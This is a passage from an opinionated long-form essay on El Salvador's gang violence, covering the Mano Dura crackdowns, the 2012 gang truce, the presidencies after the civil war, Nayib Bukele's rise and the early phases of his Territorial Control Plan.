like a Fortune 500 Company, tried to keep a low profile, and heavily invested in legal businesses to legitimize their operations. In contrast, Escobar ended up running his business into the ground precisely because he brought far too much attention to himself with self-aggrandizing stunts like running for Parliament, organizing a heist of the Supreme Court, conducting terrorist bombing campaigns targeted at civilians, and presenting himself as a Robin Hood-esque man of the people. Even with their professionalization processes in the early 1990s and the development of “criminal capital” in the US, MS-13 and B-18 have always been far on the honor side of the spectrum. This is not only evidenced by their origins and meager earnings, but also explains a lot of their… tactically sub-optimal behavior. It explains why the leaders of the gangs all end up in jail (instead of mansions like Escobar and the Cali Cartel leaders), why the vast majority of gang members tattoo their entire bodies even though it makes them obvious targets for law enforcement, why the gangs have been able to take tremendous control over El Salvador’s streets but little control over its government, and why so many children and young adults are lured into organizations that seemingly destine them for death or prison for extraordinarily little monetary reward. And the honor-orientation explains the sky-high murder rates. Murders, gang wars, civilian casualties, dead police, and all the attention they bring are not good for business. They may be necessary for illicit business, but the wisest gangs figure out that bloodshed is a cost that must be carefully justified. This reality has not stopped MS-13 and B-18 from murdering each other for 20 years and trapping thousands of innocent civilians in the crossfire. In other words, by my estimation, it is precisely because Salvadoran gangs are relatively poor, disorganized, and unambitious that they are so dangerous. Both the gangs as a whole and individual members have less to lose from fighting. Even their economic activity (extortion) is relatively unaffected by violence, and may even be made more lucrative by violence as it inspires fear and compliance. In contrast, the more commerce-oriented narco gangs that dominate South America and Mexico have enormously complex logistic operations to maintain and war is nearly always a pure cost. Caveat – Non-Gang Criminality I think there’s an underexplored or maybe misunderstood aspect of crime in El Salvador. When media outlets, pundits, and researchers talk about crime in El Salvador, it is typically considered synonymous with gang activity. The standard story of Salvadoran crime is that lots of Salvadorans fled the country during the civil war (1980-1992), the young refugees joined gangs and developed criminal capital in the United States, then they were deported back to El Salvador where they formed the powerful gangs that terrorized the country for the last 20 years. But look at these two graphs. First, the Salvadoran murder rate per 100,000 citizens: Second, here’s deportations from the US to El Salvador: Notice that El Salvador’s murder rate peaked before the influx of Salvadoran criminal deportees. The US started to increase deportations in 1996 with the Illegal Immigration Reform and Immigrant Responsibility Act and then really started to ramp up deportations in 2003; but throughout that 1996-2003, the murder rate plummeted from 139 to a low of 47 in 2002. This means that El Salvador’s crime rate went down as more criminals came to the country. In other words, El Salvador’s worst crime years came from non-gang affiliated Salvadorans. I have tried to look into this but have found absolutely no explanations for who was doing all this killing in the late 1990s. My best guess is that there were a lot of reprisals and general lawlessness in the aftermath of the civil war that ended in 1992, but again, I haven’t actually seen any documentation of this. Looking at the post-2003 era, there also doesn’t seem to be much correlation between the number of gang members in El Salvador and the murder rate. Gang member estimates are hard to find, but the peak was likely either in 2015 or 2018 for reasons I’ll elaborate upon in the coming section. Yet the murder rate was generally parabolic until a peak in 2015 and then went into a fairly fast decline thereafter. Granted, the murder rate during this entire era was significantly impacted by the government’s law enforcement strategies (which barely existed prior to the Mano Dura policy of 2003), so maybe any correlation (or lack thereof) between the murder rate and the gang membership during this era is meaningless. However, there is evidence that though the gangs commit an outsized proportion of criminal behavior, non-gang criminality is still a major factor in El Salvador. For instance, in 2005, the Salvadoran government stated that 50% of murders were committed by non-gang members. Another report from the National Civil Police from around the same time estimated that 60% of criminal activity came from the gangs. Obviously this doesn’t lessen the horrors of the gangs in any way. But I think it’s important not to frame the Salvadoran crime problem as “a bunch of sociopaths were deported from US prisons and began terrorizing the helpless, innocent Salvadoran people.” El Salvador had been an extremely violent country for a good century before the gangs arrived. It had a history of military dictatorship, right wing death squads, left wing guerrillas, and civil wars. The gangs somewhat monopolized the background violence, and may have even deterred it, but El Salvador’s criminality is not limited to MS-13 and B-18. Combatting the Gangs The government of El Salvador slowly got back on its feet after the civil war. The reconciliation between the right and left wing went fairly well and elections were peaceful and sufficiently free and fair. The right wing ARENA party won the presidency in 1994 and again in 1999, with each president constitutionally limited to a single 5 year term. But in the early 2000s, the conservative stranglehold was slipping. Crime was considered to be spiraling out of control as the gangs solidified their dominance over El Salvador and much of Central America. Here’s a Washington Post article from the time that starts off with: “The head of a young girl, hacked off with an ax, was found in a burlap bag in October in this industrial port on the Caribbean. The bag also contained a note to President Ricardo Maduro from Mara 18, an ultra-violent street gang, saying that the killing was “in memory” of a gangster who had been killed by police.” It didn’t help that El Salvador’s conservative administrations were seen as subservient to the US government, which after arming the death squads of the predecessor administrations, was now dumping thousands of hardened criminals into the country. President Fransisco Flores Perez saw the writing on the wall and feared the FMLN would finally take power after he left office. He decided that bold action needed to be taken against the gangs to salvage an ARENA victory in the upcoming 2004 election. In July 2003, President Flores announced “Mano Dura” (“Firm Hand”) on the radio. The government ordered its new civilian police force, with some military assistance, to flood into the worst neighborhoods of El Salvador and arrest anyone they suspected of gang activity under a new set of laws permitting far greater police powers. This sounds extraordinarily dangerous and difficult, but it turned out to be surprisingly easy to do. The vast majority of gang members were covered in tattoos, often with explicit gang symbols (like devil horns or a big “18”). The government forces simply overwhelmed the gangs by appearing quickly and with far more firepower, much of which was financed by the US taxpayer. The result was the arrest of 20,000 suspected gang members across the country in a matter of months. As far as I can tell, there wasn’t even much bloodshed in the process. Murders and violent crime rates plummeted. Neighboring Honduras and Guatemala were so impressed that they quickly instituted their own Mano Dura policies, albeit less harsh ones. President Flores declared victory over the gangs and his ARENA party would go on to win the next presidential election in 2004. But El Salvador’s apparent triumph over the gangs had a few problems. First, by this point in the early 2000s, the US deportations were only beginning to ramp up and the gangs weren’t yet that powerful. Some estimates of the total gang population in El Salvador at that time were as low as 6,000… which is a lot lower than the 20,000 arrested. A 2004 estimate cited by Hume is 10,000-39,000. That’s substantially more, but clearly a lot of innocent people were swept up in the chaos, maybe even mostly innocent people. Second, there were widespread reports of human rights abuses. Individual policemen were essentially given judicial power, which whether by error or malice, explains why the police may have overshot their arrests so dramatically. Often the police made arrests based on tips, so lots of people were settling disputes and grudges by sending their annoying neighbors to prison. Third, some analysts (like Wheeler) have argued that Mano Dura inadvertently strengthened the gangs in the long run by testing their coordination ability. Up until 2003, the gangs were starting to build up as MS-13 and B-18 members trickled back to El Salvador from the US and recruited locally in El Salvador, but absent strong law enforcement or external rivals, there was little organizational pressure to increase operational efficiency. Mano Dura shocked the gangs and prompted management reforms. If Mano Dura had crushed the gangs entirely, the reforms would have been futile, but… Fourth, and most importantly, 85-95% of the suspected gang members arrested during the crackdown were released within six months. The constitution of El Salvador is very Western and protects the standard rights of due process. The Salvadoran Supreme Court ended up striking down most of Mano Dura and virtually all of those rounded up were let back onto the streets. I’ve read different interpretations of why this occurred. Right wingers (including someone I spoke to in El Salvador) say that the ARENA-led government was opportunistically stabbed in the back by the FMLN, which held much of the legislature and courts, to undermine ARENA’s surging poll numbers in the upcoming elections. Left wingers say that the courts followed their constitutional duty. Regardless, the general consensus I’ve gotten from media and economic sources (as well as Wheeler) is that Mano Dura was mostly bullshit to begin with. It was all flash and no substance. The crackdowns were too brief, not thorough enough, and did nothing to alleviate the fundamental causes of gang activity (ie. poverty, disenfranchisement, inequality, etc.). It was designed to look good in newspapers and create a very visible impact for voters, but ARENA never expected the laws to pass the courts, and could blame the inevitable shutdown of Mano Dura on the FMLN. That may well be an accurate assessment of ARENA’s movies, but I think the negative historical consensus on Mano Dura is too harsh. As far as I can tell, the strategic elements of 2003’s Mano Dura weren’t that different from Bukele’s extraordinarily successful gang crackdown in 2022. As I’ll get into later, the main differences were that Bukele had far more widespread support from the other branches of the government and the Salvadoran people, better management of the imprisoned suspects, and hit even harder with police and military forces. But the principles of the policies were the same – arrest everyone in sight who might be gang-related and figure out the details later. In 2004, ARENA’s Antonio Saca was elected president. Mano Dura had given the party the bump it needed to defeat the FMLN, but as the Mano Dura policies were struck down, ARENA found itself back where it started. El Salvador’s economy was still terrible, the gangs were back to terrorizing people (the World Bank’s figures actually have the murder rate increasing by 16% from 2003 to 2004, other sources say there was a slight decrease), and the US continued to ramp up deportations. Perhaps worst of all from an electoral perspective, ARENA was rightly seen as incredibly corrupt. Former President Flores would later be charged with embezzling $10-15 million worth of aid sent to the Salvadoran government from Taiwan to help earthquake victims, and he would die in 2016 while under house arrest. His successor, President Saca, was described: “the brazen manner in which [President] Saca and his people are widely perceived to have used their positions for personal enrichment went beyond the pale.” He would go on to set the Salvadoran corruption high score by embezzling and misappropriating about $300 million; he’s been sitting in Salvadoran prison since 2018. With the 2009 presidential election coming up, ARENA again feared its time was up, so it tried the Mano Dura gambit once more. It needed an even bigger and better crackdown on crime to prove that the party could clean up El Salvador. So in 2006, the government launched… Super Mano Dura, or “Super Firm Hand.” I can’t find a ton of information on this second crackdown, but it seemed to be slower and more measured. Rather than blitzkrieg the streets with thousands of police, the government slowly implemented tougher laws to increase sentencing and criminalize lower tier criminal behavior, while beefing up the standing police force. Lesser forms of many of these laws were briefly in place during the first Mano Dura but had been struck down. The “broken window theory” most associated with New York Mayor Rudy Giuliani may have been an influence. Unfortunately for ARENA, the magic didn’t work again despite a modest drop in the murder rate. For the first time in the post-civil war era, the ex-guerrilla FMLN took power under President Mauricio Funes, a former journalist who had interviewed leftist rebels during the civil war but had never joined their cause. Funes initially focused on poverty-relief efforts but there wasn’t much an impoverished state of an impoverished country could do about that. Inevitably, he had to confront the gangs, which had not only maintained their power, but considerably grown in strength over the course of the previous regime. But the Funes regime didn’t want to go back to Mano Dura. The FMLN had spent half a decade criticizing the tough-on-crime policies as brutal, authoritarian, misguided, and as a band-aid solution that ignored the more fundamental causes of crime in El Salvador. According to Wolf writing back in 2011, the new regime initially began scaling back Super Mano Dura to focus on systemic reforms, but then stopped as the media and public pushed for faster anti-crime results. But if the regime couldn’t fight the gangs directly, what could it do? On March 11, 2012, the Salvadoran news outlet El Faro alleged that the Funes regime had begun to negotiate a truce between MS-13, B-18, and the government in an effort to reduce the crime rate. The government would treat imprisoned gang members better and pursue less aggressive enforcement strategies on the streets if the gangs would agree to lessen the rate at which they murdered each other and innocent people. On March 12, the following day, El Salvador had only two murders, the lowest level in a single day in over three years. The full extent of the negotiations between the regime and the gangs wouldn’t be known until later. For a time, the government and the Catholic Church collaborated to make it seem like the latter was actually handling the process and the former wasn’t involved at all. Then the government admitted it was at least being kept in the loop, and then eventually admitted full responsibility, though it continued to conceal the precise terms of the negotiations. The eventually acknowledged official concessions made by the government within legal parameters were first to give better prison conditions (transference to lower security prisons, permitting more family visits, etc.) to the many incarcerated gang members, particularly the leaders of MS-13 and B-18. Later on, the frequency and intensity of raids targeting gangs in the streets were reduced, though not eliminated. “Safe zones” were established in particular neighborhoods and around schools where the gangs promised to limit their activity. Most ambitiously, and in line with the FMLN’s ideological bend, the regime announced a $20 million subsidy plan to assist gang members in finding legitimate employment, with which the gang leaders promised to assist, or at least not interfere. The Funes regime initially faced backlash, but with a media blitz and a marked reduction in violence, public opinion started to turn in mid-2012. According to the World Bank’s numbers, the homicide rate dropped from 71 per 100,000 in 2011 to 42 in 2012 and 41 in 2013. The previous low ever recorded was 47 back in 2002. After years of trying to crush the gangs, a softer touch appeared to be working. But as with the Mano Duras, the gang truce’s success seems more illusory in hindsight. First, it fell apart fairly quickly. After a massive anti-gang government raid in mid-2012, murders began to rise again; the gangs blamed the government for infringing on the truce while the government blamed the gangs for excessive reprisals. Homicides continued to climb in the second half of 2012, and the truce appeared to completely break down in some neighborhoods, though it wasn’t clear if that was due to the orders from gang leadership or if individual sub-gangs were operating outside of orders. By mid-2013, rumors were circulating that the gangs considered the truce dead, but were biding their time to accumulate more weapons for a coming offensive against the government and each other. As violence resurged in late 2013, the truce was universally considered over. Second, while the truce reduced homicides temporarily, it may have actually just pushed them into the future as pent-up aggression resulted in more violence and reprisals later on. From a homicide rate of 41 in 2013, it rose to 63 in 2014 and 107 in 2015, the highest level since 1997. Third, Wheeler and others have argued that the stats were juked, maybe by the government, but likely more so by the gangs. As part of the negotiations, the gangs agreed to reduce the murder rate, but the gang leadership may have just ordered their underlings to hide the murders better as opposed to leaving the bodies in the streets like normal. If this is true, then the supposed spike in homicides after 2013 may have just been the result of uncovering corpses created during the truce. Fourth, the legitimacy of the FMLN and the Salvadoran government as a whole was massively damaged as the full extent of the truce negotiations was revealed. The government didn’t just give the imprisoned gang leadership bigger cells and more family access, they gave them whatever material goods and services they wanted, including drugs, alcohol, prostitutes, and, worst of all, likely tens of millions of dollars. Negotiating with criminals (arguably terrorists) is already a tough pill to swallow, but straight-up bribery made the government look weak and desperate. President Funes and some of his top lieutenants would later be prosecuted for both perpetrating corruption as part of the truce and for receiving the benefits of corruption outside of the truce. Funes is currently living in exile in Nicaragua while a 14 year prison sentence awaits him back in El Salvador. Fifth, part of the government’s concessions to the imprisoned gang leaders was to give them cell phones for personal use and to order/coordinate the truce with non-imprisoned lieutenants. This had the inadvertent effect of massively improving the top-down organizational capabilities of MS-13 and B-18. The gang leadership was already communicating with its non-incarcerated underlings, but at least the process of sneaking out messages was slow and cumbersome. With cell phones in hand, the leadership became far more dynamic and apparently managed both the implementation and breakdown of the truce more skillfully than they should have. Like the Mano Duras, the gang truce of 2014-2016 has been considered a failure by historical consensus. Its benefits were decent, but short-lived and possibly entirely fake, and they came at the cost of humiliating an already weak government while emboldening and probably strengthening the street gangs that already seemed to be on the path to taking over the entire country. But as with the Mano Duras, I’m slightly more sympathetic than the historical consensus. The Salvadoran government was contending with an enormous, complicated, intractable crime problem with roots in culture, economics, civil war, and so many other domains. The hardline conservative crackdowns didn’t seem to have worked, so the left needed an alternative. I assume the more idealistic elements of the FMLN would have liked to implement more far-reaching welfare and social reforms to rebuild El Salvador’s broken society from the ground-up, but that wasn’t practical. So trying to slowly calm the gangs rather than fight them may have been a viable strategy. Remember: the gangs were not an invading force. Their members were Salvadoran citizens, and most were literal children with bad upbringings. If there is a way to reintegrate such people into society, it should be tried, and if that meant giving some imprisoned psychopaths prostitutes and money, so what? In the grand scheme of things, that price seems worth saving tens of thousands of lives and revitalizing El Salvador. Unfortunately, the truce just didn’t work. Fortunately for the FMLN, the full extent of the truce’s failure wasn’t known until after the 2014 presidential election. The Salvadoran people narrowly elected Funes’s Vice President, Salvador Sánchez Cerén, a 70-year-old ex-commander of the leftist guerillas. The former warrior proceeded to be boring and useless, resulting in “little to show for his tenure.” I guess in his defense, Cerén took office at the absolute worst time, right when the truce was falling apart. At first, he tried to restart negotiations with the gangs, but the situation was too far gone. His first full year in office saw the homicide rate spike to 107 and the streets ran with blood. The Cerén regime responded with a military-led crackdown, but it lacked the scope, surprise, and support of the earlier Mano Duras, and the gangs were far stronger and more organized in their opposition. The Cerén regime revoked the prison conditions granted to the gang leadership previously, which did hinder gang operations, but lieutenants on the streets were too entrenched for the military to make any serious headway in taking back de facto territorial control. Like his predecessors, Cerén is regarded as a corrupt, weak failure as a president. There are lots of Western news articles from the time describing El Salvador as a war zone. And yet, the murder rate declined during his regime, and by quite a bit at that – from the peak of 107 in 2015 to an all-time low of 38 when he left office in 2019. The initial decline could have been from a return to baseline after the post-truce crime spike, but then the murder rate continued on a fairly steep downward trend despite the lack of any novel or impressive policy changes from the government. Crime was still extremely high throughout Cerén’s tenure but was trending sharply in the right direction. I haven’t seen much analysis of why the murder rate declined so much during this time period, but a possible cause was the Alliance for Prosperity (AFP), a massive aid program initiated by the United States in 2014 to give $750 million annually to El Salvador, Guatemala, and Honduras (combined) to reduce crime, fight corruption, and stimulate economic growth. The slightly less than altruistic motive behind the AFP was to make these countries more stable and prosperous so all their citizens would stop sneaking into America, but regardless, it seemed to work, at least on paper. Honduras and Guatemala both saw similar declines in the crime rate, though not as dramatically as in El Salvador. The New York Times has a bunch of really good articles (ex. this) from 2018 and 2019 describing the impact of AFP: “The United States is involved in almost every layer of El Salvador’s efforts to cauterize the near-constant gang violence. It is equipping and training an elite anti-gang unit of Salvadoran police and building new prosecutors’ offices. Judges take classes at American facilities, and F.B.I. agents work alongside Salvadoran police officers.” Two details that most stuck out to me – as late as 2018, El Salvador had a single forensics lab to cover the roughly 4,000 annual murders. And, as mentioned – only one in 20 prosecutions of gang members ended in conviction due to threats from gangs towards witnesses, judges, juries, etc. These articles don’t paint a good picture of El Salvador’s progress, but the numbers tell a different story. Until I see a better explanation for the decline in the violence of the gangs, it seems like the AFP did quite a good job of enhancing El Salvador’s law enforcement capacity and capability. The AFP’s success in fighting corruption is more suspect, especially when President Cerén followed the by-then well-established tradition of Salvadoran presidents stealing lots of money. In 2021, he and a bunch of other formal officials were convicted for operating a kickback scheme that looted $351 million from the state during President Funes’s regime, when Cerén was vice president. If I’m reading this correctly, Cerén’s cut from the entire scheme was… $530,000. Though everyone thinks he stole a ton of money while he was president too, likely some AFP money at that. For those keeping track, that means from the end of the civil war in 1992 to 2019, El Salvador had five presidents, the last four of whom were later convicted of corruption, though only one saw prison time. It would be one thing if the corrupt assholes running their country were doing a good job (like FHB), but the Mano Duras seemed to have failed, the truce had both failed and been disgraceful for a sovereign state, and no one in government seemed to have any better ideas on how to fight the gangs than to listen to the gringos. It was safe to say that the Salvadoran people had lost faith in their leadership. The Rise of The Coolest Dictator in the World El Salvador’s current president, Nayib Armando Bukele Ortez, is easily one of the most interesting political leaders on earth. The first person I’d compare him to is Alberto Fujimori. Both Bukele and Fujimori are non-Hispanic men from wealthy immigrant families who worked their way up the political hierarchies of Latin American states with undeniable skill and then led their countries as low-tier dictators, and despite the complaints of many critics, generally did a good job and were popular. But maybe the better comparison for Bukele is Julius Caesar. He’s not quite the dashing, dynamic, militaristic embodiment of Caesar like Napoleon was, but Bukele’s parallels are undeniable, at least between the early reigns of both men. Bukele rose from relative obscurity to take over an ostensibly democratic, but really oligarchic country with much fanfare and popular support. He’s widely reviled by the elites, but now that he’s in power, they dare not oppose him openly because he has the love of the mob. He uses force to destroy his worst enemies, but is generally magnanimous and opts for friendship when he can. He is almost single-handedly reshaping the government with his will, and perhaps the rest of society with it. These efforts are constantly derided by small “d” democrats, and yet his personal support only continues to grow with the vast majority of his subjects. But I think the single greatest similarity between Bukele and Caesar is their luck. Back in Roman times, luck was considered an innate attribute of individuals, like charisma. Caesar was phenomenally competent in many aspects of his life, but he paired this with an almost supernatural level of luck in war, politics, and governance that he was able to maximally exploit (until he wasn’t). That’s exactly how I feel about Bukele after learning about him. He is really smart, he’s highly intuitive, he has a great sense of what to do and when as a politician, but he has ultimately been so incredibly successful because he has married this competence with so often being in the right place at the right time. Bukele was born in San Salvador in 1981, right at the start of the Salvadoran Civil War. He comes from a well-off Palestinian Arab family that is historically Christian. Bukele’s many siblings and cousins have played small parts in his rise to power, but his father is definitely the most interesting relative. Despite his Christian background, Armando Bukele Kattán is an Islamic imam who has established four mosques in El Salvador. He’s also a prolific entrepreneur and businessman who opened El Salvador’s first McDonalds. He’s also a polygamist with six wives and 11 children, of which Nayib Bukele is the fifth. Bukele, who self-identifies as a vague non-denominational Christian, seems to have a sense of humor about his Islamic family: “Popular enough to be elected president of his high-school class, he captioned his yearbook photograph ‘Class terrorist.’” Bukele dropped out of law school at Central American University and started managing a nightclub, and at some other point he managed a Yamaha dealership. Then he took over one of his father’s businesses, a public relations firm that represented the FMLN, of which his father was a big supporter. I can’t find a ton of info about Bukele’s life around this time, but in 2011, at the age of 30, he decided to run for mayor of Nuevo Cuscatlán, an ARENA-dominated suburb of San Salvador. Bukele ran on leftist policies under the FMLN but purposefully downplayed his association with the party; the FMLN’s name and logo were left off most campaign material, and Bukele began using cyan everywhere instead of the FLMN’s standard red coloring. Bukele narrowly won, presumably due to a combination of his energy/charisma and because ARENA was getting hammered nationally after having just lost the presidency for the first time in 2009. From the New Yorker article: “Bukele won by less than two per cent, and governed as if he were still campaigning. He erected a large stone sign with a white “N” engraved in a circle at the entrance to Nuevo Cuscatlán. He also opened a twenty-four-hour medical clinic, a library, and a community center. Each month, seniors received a free basket of food. Bukele vowed to donate his entire salary to a new program funding grants for students to take classes in English and computer science. The town’s debt ballooned, but his popularity soon eclipsed that of the Party elders.” Later investigations found he had ignored a bunch of permit bullshit and maybe gave out inflated contracts to friends. Given his future, it seems likely that Bukele hastily burned a whole lot of current and future taxpayer dollars on spurious, flashy amenities (some of which were probably useful, others of which were probably useless) to gain national attention to climb the political ranks. Though if I were to keep bringing up the annoying Caesarian parallels, I’d point out that much of Julius Caesar’s early career also consisted of recklessly going into extreme debt to buy popularity. Regardless, Bukele was beloved by the people of Nuevo Cuscatlán for mortgaging their future. So in 2015, with the eager support of the FMLN, Bukele ran for Mayor of San Salvador. Trying to go from the mayor of a town of ~8,000 inhabitants to the mayor of the capital city of 2 million (metro area) is a hell of a leap, especially for a 34 year old. Once again, Bukele ran under the FMLN but did his best to distance himself from the party’s apparatus and legacy. His campaign lieutenants were a bunch of friends and family members instead of party officials. All of his campaign paraphernalia had his trademark cyan, “N,” and slogan, “nuevas ideas.” He became an even better candidate than before – polished, fun, energetic. He really found his stride in digital media, which was partially motivated by an aversion to mainstream journalists whom he (rightly or wrongly) considered to be establishment shills. In videos posted on Twitter, Instagram, Facebook, etc., Bukele presented himself as a young, dynamic force challenging the ossified political establishment that had led El Salvador astray through corruption and general incompetence. Soon enough, Bukele had huge viewership numbers and was dominating the polls, but like any good social media addict, Bukele behaved like he had ADHD: “In public, Nayib was polished and poised, but in private meetings he tended to be distracted and jittery. He checked his phone constantly, drank four Red Bulls a day, kept odd hours, and struggled to focus on individual tasks. A former associate told me, ‘If an idea occurs to him, and he thinks it’s brilliant, he does it. Then, afterward, if it’s illegal? Oops!’” In another article, one of his former lawyers calls him: “an immature and impulsive man, addicted to his phone and social media. He couldn’t go 30 minutes without checking Twitter to see what people were saying about him. ‘He was always very scattered. It’s hard for him to focus and get organized…’” Bukele and the FMLN won the election with just over 50% of the vote, unseating the incumbent National Coalition Party that had held San Salvador’s mayoral office for the last six years. Now in his second and far more powerful office, Bukele basically did the same thing again. He used city funds to build a big market, a big library, refurbish the historic downtown, and widen a bunch of streets. A lot of these new buildings and sidewalks were conspicuously painted cyan and big “N”’s appeared on walls, in parks, and on murals. The mayor also spent a lot of time meeting with foreign officials from the United States and Taiwan, and made a high profile trip to Jerusalem where he told the world that his wife’s grandfather was Jewish. In the future, Bukele would make a name for himself internationally through phenomenally successful tough-on-crime policies. But as mayor of San Salvador, his opening anti-crime policy salvo was… trying to negotiate a truce. El Faro, the intrepid media publication that would go on to become a serious thorn in Bukele’s side, published prison records indicating that he had sent emissaries to meet with leaders of B-18 to negotiate a reduction in the gang’s presence in key locations in the city. Bukele did, and always has denied negotiating with any criminals, and responded to El Faro’s articles by making some angry speeches and beefing up the street presence of the police. The sour relations between the FMLN and Mayor Bukele only got worse as time went on. Bukele was technically in the FMLN, but he had a habit of openly insulting them for being sluggish, corrupt dinosaurs tethered to civil/Cold War politics. In turn, the FMLN leadership increasingly felt like it was playing with fire; it had managed to leverage this arrogant, young hot shot to take the mayoral office of San Salvador, but it wasn’t clear they could control him, especially since the office was often a stepping-stone to the presidency. Many considered Bukele more trouble than he was worth. In May 2017, the tensions erupted at an FMLN event. Lots of attendees describe what happened differently, but Bukele allegedly accused party members of conspiring against him, and then may or may not have thrown an apple at a lawyer. Afterward, the FMLN’s leadership convened a meeting in which they narrowly voted to expel Bukele from the party (after he refused to attend a disciplinary hearing). Many of the defenders of Bukele within the party’s leadership were not actually favorably inclined toward the man, but feared that losing him would tear apart the FMLN. Which is precisely what happened; the expulsion only sling-shotted Bukele toward his destiny. The FMLN got hammered in the 2018 mid-term elections, and when Bukele announced he was running for president in the 2019 elections, he immediately stole a huge chunk of the FMLN’s base. This support held even as he went through a bureaucratic rigmarole where it seemed like he might run with the FMLN again, but then he started his own party, but then that party was dissolved by election officials, and so Bukele ended up joining a minor right-of-center party which opportunistically slapped his name on their banners. Regardless, Bukele ignored this party and largely ran under his newly crafted, technically non-existent, cyan-colored Nuevas Ideas party anyway. The actual policy platform of Bukele’s presidential campaign was fairly light. He proposed building some big infrastructure projects (but not how to pay for them) and fighting the gangs (with no clear strategy). But mostly, he ran as an honest, truth-telling outsider who would fight the culture and practice of corruption that had rotted El Salvador since the civil war. And without the encumbrance of FMLN membership, Bukele could openly declare war on the political establishment, particularly the two political parties that had dominated Salvadoran politics for almost 20 years. These quotes are from a 2023 speech, but they represent his message to the Salvadoran people well: “For decades, we tried everything that others said was best for us. They made us fight a civil war for a cause foreign to our reality [referring to the Cold War]…. They made us sign false peace agreements, which had nothing of peace, and which only served to allow the two sides in the war to share the spoils. We tried every formula they gave us, and nothing worked. Then, protected by foreign powers, we handed the country over to the Right. And then, also protected by external agents, we gave power to the Left. This is how they kept us during 30 post-war years, during which there were more deaths than in the civil war, and more poverty and more violence. Nobody did anything to fundamentally change either the system or the institutions, much less the laws.” Bukele’s campaign tactics matched the rhetoric. He barely left San Salvador, he boycotted the debates, and he refused to talk to most establishment shills journalists. Instead, he leaned on an expertly crafted social media campaign that either showed him making speeches to fanatically loyal crowds in San Salvador, or calmly explaining El Salvador’s problems from the comfort of his own living room. The result – Bukele massacred the establishment with 54% in the first round to ARENA’s 32% and the FMLN’s 14%. Bukele also won every single department (ie. province) across the country. With more than 50% of the popular vote, there wasn’t even a second voting round. In 2012, Bukele had no political experience aside from doing PR work for the FMLN. That year, he was elected mayor of a town of 8,000. In 2015, he was elected mayor of the capital city. In 2019, Bukele became the youngest president (age 37) of El Salvador in its history and the first to win from outside the two major parties since the civil war. I find this all astonishing. Does stuff like this happen normally in small, poor countries? Was Bukele an unusual Obama-esque wunderkind? Did Bukele’s family pull some strings? Despite reading everything I can find about Bukele, I still don’t have a grasp on how he was able to get so popular so quickly. As far as I can tell, Bukele is simply an excellent campaigner, and his anti-establishment messaging hit the Salvadoran people at exactly the right time, and Bukele got lucky. The establishment had humiliated itself with El Salvador’s low GDP growth, dire tourism levels, thoroughly corrupt leadership, and rampant crime, the last of which had reduced the state to bribing thuggish criminals to stop murdering its citizens. Bukele arrived in the right place at the right time with the right message. Consolidation Nayib Bukele came into the presidency of El Salvador on an enormous wave of enthusiasm. He had a clear mandate from the people to effect radical change throughout the Salvadoran state. It wasn’t quite clear what that change would be aside from rooting out corruption, but people were optimistic that the country would finally turn around. But there was one big problem for Bukele. While his fortuitous political party hopping had helped win him the presidency, it had also left him without an actual elected political base of support. The last legislative elections were in 2018, resulting in ARENA holding 42% of seats and the FMLN holding 25%. While some of these elected individuals had been swayed to Bukele’s side (either idealistically or cynically), most were entrenched members of precisely the political establishment Bukele had been railing against for the last year. Likewise, the Salvadoran Supreme Court consisted of judges elected by the current and past legislative assemblies. In other words, Bukele had complete control of one branch of government, but faced strong hostility from the other two. Fortunately for Bukele, he was uniquely situated to deal with this problem. His campaigns, policies, platforms, and personality had all emphasized his placement outside the traditional party system, so the loyalty of his followers was oriented directly toward him rather than any party or organization. Shortly after the election, all the cyan and “N”s came to fruition as Bukele brought Nuevas Ideas to life as a functional, recognized political party in El Salvador. It wasn’t a party of the right or left, but a party of Bukele, and the hundreds of politicians and millions of Salvadorans who flooded into its ranks were loyal to the individual. But even with all the popular support in the world, Bukele still had to wait until the 2021 legislative elections to expand his power. Until then, he had to work with one measly branch of government to not only reshape El Salvador, but to prove his value to voters before the elections. He needed a big win, and he needed it soon. Bukele set his sights on the gangs. If he could deliver a lower crime and rate to the Salvadoran people within a year, it would surely catapult Nuevos Ideas to total power. Bukele unveiled the Territorial Control Plan (TCP). It was to be the most ambitious, comprehensive, expensive assault on gangs in Central America’s history. Like the Mano Duras, the TCP was a bundle of policies and laws designed to crush the gangs, but while the Mano Duras were swift strikes intended to arrest as many gang members as possible, the TCP was a methodical, multi-stage operation aiming to strangle the gangs over many years. With an estimated total cost of $572 million, Bukele promised that the TCP would end the Salvadoran gangs once and for all. Phase One of the TCP was initiated mere days after Bukele announced it to the public at midnight of June 20, 2019 – 12 of El Salvador’s 262 municipalities, representing most of the metropolitan areas of the country, would receive an influx of 2,500 police officers and 3,000 soldiers (with another 1,000 deployed a month later) to be indefinitely stationed in key locations to suppress gang activity, particularly extortions. Additionally, all 28 of El Salvador’s prisons were put under a state of emergency, meaning all prisoners were confined to their cells, visitations were cancelled, and cell service was blocked. Combined, the operation was intended to hinder gang financing, cut off the leadership, and reduce the murder rate. The operation initially received largely positive reviews. 5,000 arrests were made within the first two months. Crime decreased in key zones and the national crime rate seemed to decline, but arguably best of all, Bukele’s efforts to fight crime were highly visible. Putting a bunch of assault rifle-wielding soldiers in the town square is not exactly a subtle way to fight systematic extortion, but it works, and the Salvadoran people could see it in action. From AS/COA: “An August 2019 Prensa Gráfica poll found that in just the first couple months of the plan’s rollout, the percent of Salvadorans who felt unsafe in the places they frequent the most dropped from 78 percent to 57 percent, while approval for the national police force increased 11 points year-on-year. El Salvador experienced a 33 percent drop in homicides from 2018 to 2019, according to Insight Crime data.” Eventually, critics emerged. They pointed out that the operation was expensive, the murder rate didn’t seem to be declining any faster than before, and the TCP did nothing to address the fundamental causes of El Salvador’s gang problem. Stationing troops in markets was another band-aid solution to extortion that would merely push the gangs to launch new operations elsewhere. Bukele countered that this was just Phase One. The TCP had seven planned stages – preparation, opportunity, modernization, incursion, extraction, integration, and… the seventh phase still doesn’t have a name as of writing this. With Phase One declared a success, Phase Two was announced in July. If critics wanted lefty policies to address the root causes of criminality, that’s exactly what they would get – the government would build a whole new set of healthcare facilities, sports centers, and schools (with generous scholarship funds) to get Salvadoran children off the streets and away from the gangs. The price tag was estimated at $158 million, a considerable sum for humble El Salvador. But through some wrangling, the Salvadoran government got a $91 million loan from the Central American Bank for Economic Integration, which is financed by Central American governments with a splattering of foreign support, including from Spain, Taiwan, and South Korea. Try as I might, I can’t find any good info on whether any of this stuff from Phase Two was ever built or if it’s functional. So, moving on… In August 2019, Bukele announced Phase Three of the TCP. The police and military, upon whom Bukele was increasingly relying, needed upgrades. They needed modern weapons, bulletproof vests, night vision, a helicopter, drones, and everything else a well-equipped fighting force needed to combat a quasi-insurgency. 